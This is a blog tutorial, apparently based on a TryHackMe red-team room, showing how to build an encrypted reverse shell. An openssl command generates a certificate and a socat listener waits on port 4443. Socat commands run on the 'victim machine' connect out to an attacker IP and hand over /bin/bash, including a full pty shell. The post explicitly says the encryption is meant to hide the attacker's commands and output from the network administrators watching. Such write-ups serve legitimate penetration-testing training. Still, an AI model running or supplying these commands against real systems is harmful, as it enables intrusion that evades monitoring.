---
title: "Socat - Encrypted reverse shell"
author: Nasrallah
description: ""
date: 2022-12-21 00:00:00 +0000
categories : []
tags: [linux, easy, reverse-shell, socat, openssl]
img_path: /assets/img/others/socat
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Reverse shells are used a lot for getting foothold on the target systems, but these reverse shells use a clear text-based communication which allows administrators monitoring the network to not only see the commands that are run on the target but also see the output that is displayed to the attacker, which leaves the latter in a vulnerable position.

We are going to use `socat` that utilizes an encryption key created with `openssl` and set `socat` to use that key to enforce encryption as it listens for incoming connections.

## **Socat**

We create the key with `openssl` using the following command:

```bash
openssl req -newkey rsa:4096 -x509 -days 1000 -subj '/CN=www.revshell.thb/O=Rev Shell/C=UK' -nodes -keyout revshell.key -out revshell.crt
```

 - req: Indicates that this is a certificate signing request.

 - -x509: Specifies that we want an X.509 certificate.

 - -newkey rsa:4096: Creates a new certificate request and a new private key using RSA with the key size being 4096 bits.

 - -days 1000: Sets the validity of the certificate to 1000 days.

 - -subj: sets data such as organization and country.

 - -nodes: Or No DES which means OpenSSl will note encrypt the private key.

 - -keyout: Specifies the filename of the private key.

 - -out: Specifies the filename of the certificate request.


Now we need to create a Privacy Enhanced Mail `.pem` file by concatenating the private key `.key` and the certificate `.crt`

![](1.png)

With that, we can start listening using the key for encrypting the communication with the client.

```bash
socat -d -d OPENSSL-LISTEN:4443,cert=revshell.pem,verify=0,fork STDOUT
```

 - -d -d: provides debugging data(error, warning..)

 - OPENSSH-LISTEN:4443: indicates that the connection will be encrypted using OPENSSL and sets the listening port to 4443.

 - cert=PEM_file:provides the PEM file to establish the encrypted connection.

 - verify=0: disables checking peer's certificate.

 - fork: creates a sub-process to handle each new connection.

Now on the victim machine we execute the following command:

```bash
socat OPENSSL:10.10.10.10:4443,verify=0 EXEC:/bin/bash
```

![](2.png)

And we managed to get an encrypted shell.

We can also get a pty shell by executing this command:

```bash
socat OPENSSL:10.11.14.124:4443,verify=0 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

![](3.png)

To check if the connection is encrypted, we can intercept the traffic using `wireshark`.

![](5.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

## References

https://tryhackme.com/room/redteamnetsec

https://www.hackingarticles.in/encrypted-reverse-shell-for-pentester/